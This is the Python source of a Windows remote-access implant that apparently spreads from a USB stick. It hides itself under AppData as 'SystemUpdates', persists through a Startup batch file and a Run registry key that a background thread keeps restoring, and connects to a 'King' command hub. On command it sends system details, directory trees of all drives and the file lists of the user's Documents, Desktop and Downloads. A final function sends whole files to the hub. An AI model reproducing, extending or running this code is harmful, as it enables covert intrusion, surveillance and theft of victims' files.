import os
import shutil
import sys
import argparse
import getpass
import json
import platform
import socket
import time
import ctypes
import winreg
import threading

def establish_persistence():
    """Copies the script to the local drive and adds it to Windows Startup."""
    try:
        # 1. Define paths (Hidden in AppData)
        app_data = os.getenv('APPDATA')
        target_dir = os.path.join(app_data, 'SystemUpdates')
        target_file = os.path.join(target_dir, 'win_manager.py')

        # 2. Create the hidden folder if it doesn't exist
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)

        # 3. Copy itself from USB to the Laptop's internal drive
        # sys.argv[0] is the current location of this script (e.g., the USB)
        if os.path.abspath(sys.argv[0]) != os.path.abspath(target_file):
            shutil.copy(sys.argv[0], target_file)
            print(f"[*] Payload migrated to: {target_file}")
        
        # 4. Create the Startup trigger (.bat file)
        startup_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        bat_path = os.path.join(startup_folder, "ServiceUpdate.bat")
        
        # Only write the bat file if it doesn't exist to avoid constant overwriting
        if not os.path.exists(bat_path):
            with open(bat_path, "w") as f:
                # Use 'pythonw' if you want it to be invisible, or 'python' for testing
                f.write(f'@echo off\npythonw "{target_file}"')
            print("[*] Persistence established in Startup folder.")
    except Exception as e:
        print(f"[-] Persistence failed: {e}")
        return target_file

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
        winreg.CloseKey(key)
        print("[*] Registry persistence added.")
    except Exception as e:
        print(f"[-] Registry persistence failed: {e}")
    return target_file

def check_persistence(target_file):
    while True:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
            value, _ = winreg.QueryValueEx(key, 'WinManager')
            winreg.CloseKey(key)
            expected = f'pythonw "{target_file}"'
            if value != expected:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected)
                winreg.CloseKey(key)
                print("[*] Persistence key corrected.")
        except FileNotFoundError:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
            winreg.CloseKey(key)
            print("[*] Persistence key restored.")
        except Exception as e:
            print(f"[-] Persistence check failed: {e}")
        time.sleep(300)

def explore_drives():
    kernel32 = ctypes.windll.kernel32
    GetDriveType = kernel32.GetDriveTypeW
    DRIVE_FIXED = 3
    DRIVE_REMOVABLE = 2
    drives = {}
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        path = f'{letter}:\\'
        if os.path.exists(path):
            type_code = GetDriveType(path)
            if type_code == DRIVE_FIXED:
                if letter == 'C':
                    type_str = 'system'
                else:
                    type_str = 'secondary'
            elif type_code == DRIVE_REMOVABLE:
                type_str = 'mobile'
            else:
                continue
            try:
                dirs = list_dirs(path, max_depth=3)
                drives[letter] = {'type': type_str, 'dirs': dirs}
            except Exception as e:
                print(f"[-] Failed to explore {letter}: {e}")
    return drives

def list_dirs(path, depth=0, max_depth=3):
    result = []
    if depth >= max_depth:
        return result
    try:
        for item in os.listdir(path):
            full = os.path.join(path, item)
            if os.path.isdir(full):
                result.append(full)
                result.extend(list_dirs(full, depth+1, max_depth))
    except (PermissionError, OSError):
        pass
    return result

def harvest_user():
    userprofile = os.getenv('USERPROFILE')
    targets = ['Documents', 'Desktop', 'Downloads']
    result = {}
    for target in targets:
        path = os.path.join(userprofile, target)
        if os.path.exists(path):
            result[target] = []
            try:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        result[target].append(os.path.join(root, file))
            except (PermissionError, OSError):
                pass
    return result

def get_username() -> str:
    try:
        return os.getlogin()
    except OSError:
        return getpass.getuser()

def report_status() -> str:
    info = {
        'OS': platform.system(),
        'Version': platform.version(),
        'Hostname': socket.gethostname(),
        'User': get_username(),
        'Python': platform.python_version(),
    }
    try:
        import psutil
        uptime_seconds = time.time() - psutil.boot_time()
        info['Uptime'] = f'{uptime_seconds:.2f}s'
        info['CPU'] = f'{psutil.cpu_percent(interval=0.2)}%'
        info['Memory'] = f'{psutil.virtual_memory().percent}% used'
    except ImportError:
        info['Uptime'] = 'N/A (psutil not installed)'
    return json.dumps(info)

def connect_to_hub(hub_ip: str, port: int) -> None:
    delay = 5  # Start with 5 seconds to allow Wi-Fi to connect after reboot
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(10.0)

        try:
            print(f"[*] Attempting to reach King at {hub_ip}...")
            client.connect((hub_ip, port))
            print(f"[*] SUCCESS: Connected to Command Hub.")
            delay = 1 # Reset delay after successful connection

            while True:
                try:
                    data = client.recv(4096).decode('utf-8', errors='ignore')
                except socket.timeout:
                    continue

                if not data:
                    print("[-] Connection closed by hub")
                    break

                for message in data.strip().splitlines():
                    command = message.strip()
                    if not command: continue

                    if command == 'STATUS_REPORT':
                        report = report_status()
                        client.sendall(f'STATUS:{report}\n'.encode('utf-8'))
                    elif command == 'SHUTDOWN_NODE':
                        print('[*] Shutdown command received.')
                        return
                    elif command == 'PING':
                        client.sendall(b'PING_OK\n')
                    elif command == 'EXPLORE_DRIVES':
                        try:
                            report = explore_drives()
                            json_report = json.dumps(report)
                            client.send(f"EXPLORE_SIZE {len(json_report)}\n".encode())
                            client.sendall(json_report.encode())
                        except Exception as e:
                            print(f"[-] EXPLORE_DRIVES failed: {e}")
                    elif command == 'HARVEST_USER':
                        try:
                            report = harvest_user()
                            json_report = json.dumps(report)
                            client.send(f"HARVEST_SIZE {len(json_report)}\n".encode())
                            client.sendall(json_report.encode())
                        except Exception as e:
                            print(f"[-] HARVEST_USER failed: {e}")
                    else:
                        print(f'[?] Received: {command}')
        
        except socket.error as e:
            # This catches Error 11001 and others
            print(f"[-] King is offline or Wi-Fi not ready (Error {e}).")
        except Exception as exc:
            print(f'[-] Unexpected Error: {exc}')
        finally:
            try:
                client.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            client.close()

        print(f'[*] Retrying in {delay} seconds...')
        time.sleep(delay)
        # Exponential backoff: waits longer each time it fails, up to 30s
        delay = min(delay + 5, 30)

def parse_args():
    parser = argparse.ArgumentParser(description='Node client for connecting to the King command hub')
    parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', '192.168.100.9'), help='IP address of the King command hub')
    parser.add_argument('--hub-port', type=int, default=int(os.getenv('KING_HUB_PORT', '9999')), help='Port of the King command hub')
    parser.add_argument('--no-persist', action='store_true', help='Do not establish persistence (for testing)')
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()

    # Initialize Persistence FIRST unless testing without persistence
    if not args.no_persist:
        target_file = establish_persistence()
        threading.Thread(target=check_persistence, args=(target_file,), daemon=True).start()
    else:
        print('[*] Running without persistence for testing.')

    if args.hub_ip == '192.168.100.9':
        print('[*] WARNING: Using default HUB_IP 192.168.100.9. Update --hub-ip if King is on a different machine.')
    print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
    connect_to_hub(args.hub_ip, args.hub_port)


def exfiltrate_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, "rb") as f:
            data = f.read()
            # We send the size first so the King knows how much to catch
            client.send(f"SIZE {len(data)}".encode())
            time.sleep(1) # Wait for King to prepare
            client.sendall(data)
            return "[+] File exfiltrated successfully."
    return "[!] File not found."
